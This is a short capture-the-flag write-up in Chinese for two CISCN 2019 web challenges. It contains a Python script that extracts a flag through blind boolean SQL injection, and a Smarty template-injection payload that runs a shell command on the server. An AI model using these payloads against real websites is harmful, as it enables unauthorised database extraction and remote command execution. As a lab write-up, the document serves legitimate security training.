# CISCN 2019

## Web

### \[华北赛区 Day2 Web1] Hack World

```python
import time
import requests

url = 'http://b478134c-6e5f-4069-8910-4f12fc9bab6c.node4.buuoj.cn:81/'
results = []
session = requests.Session()

for i in range(1,43):
    start = 32
    end = 127
    for j in range(start, end):
        mid = (start + end) // 2
        data = {"id": f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"}
        time.sleep(0.1)
        ret = session.post(url, data=data)
        if 'Hello, glzjin wants a girlfriend.' in ret.text:
            start = mid
        else:
            end = mid
        if (end - start) <= 1:
            results.append(chr(end))
            print(''.join(results))
            break
```

### \[华东南赛区] Web11

底部带有提示 `Build With Smarty !` ，猜测是 Smarty SSTI 注入。

* `{php}{/php}` ，在 Smarty 3.1， `{php}{/php}` 仅在 SmartyBC 中可用。
* `{literal}` ，使得模板字符原样输出。
* `getStreamVariable` ，读取一个文件并返回内容
* `{if}{/if}`

构造 Payload 如下

```
{if system('cat /flag')}{/if}
```

查看源代码即可获得 flag 。
